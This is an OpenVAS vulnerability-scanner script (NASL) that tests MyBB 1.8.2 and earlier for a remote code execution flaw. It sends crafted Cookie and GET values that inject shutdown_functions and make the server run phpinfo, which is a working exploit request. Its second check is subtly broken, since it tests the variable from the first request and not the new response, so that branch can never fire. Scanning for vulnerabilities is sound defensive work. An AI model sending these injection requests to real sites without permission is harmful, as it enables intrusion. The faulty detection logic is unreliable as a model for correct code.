###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mybb_rce_11_14.nasl 6715 2017-07-13 09:57:40Z teissa $
#
# MyBB Remote Code Execution 
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:mybb:mybb';

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105122");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 6715 $");

 script_name("MyBB Remote Code Execution ");

 script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35323/");

 script_tag(name: "impact" , value:"Successfully exploiting this issue will allow attackers to execute
 arbitrary code within the context of the affected application.");

 script_tag(name: "vuldetect" , value:"Send a large special crafted HTTP GET request and check the response.");
 script_tag(name: "solution" , value:"Updates are available.");
 script_tag(name: "summary" , value:"MyBB's unset_globals() function can be bypassed under special conditions and it
 is possible to allows remote code execution.");
 script_tag(name: "affected" , value:"MyBB <= 1.8.2");
 script_tag(name:"solution_type", value: "VendorFix");
 script_tag(name:"qod_type", value:"remote_app");
 script_tag(name:"last_modification", value:"$Date: 2017-07-13 11:57:40 +0200 (Thu, 13 Jul 2017) $");
 script_tag(name:"creation_date", value:"2014-11-24 11:50:21 +0100 (Mon, 24 Nov 2014)");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_dependencies("sw_mybb_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("MyBB/installed");

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("global_settings.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

host = http_host_name(port:port);

req = 'GET ' + dir + '/ HTTP/1.1\r\n' +
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
      'Host: ' + host + '\r\n' + 
      'Cookie: GLOBALS=1; shutdown_functions[0][function]=phpinfo; shutdown_functions[0][arguments][]=-1\r\n' + 
      '\r\n';

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if( "<title>phpinfo()</title>" >< result )
{
  security_message( port:port );
  exit( 0 );
}

if (dir == "/") dir = "";

url = dir + '/index.php?shutdown_functions[0][function]=phpinfo&shutdown_functions[0][arguments][]=-1';
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "<title>phpinfo()</title>" >< result )
{
  security_message(port:port);
  exit( 0 );
}

exit( 99 );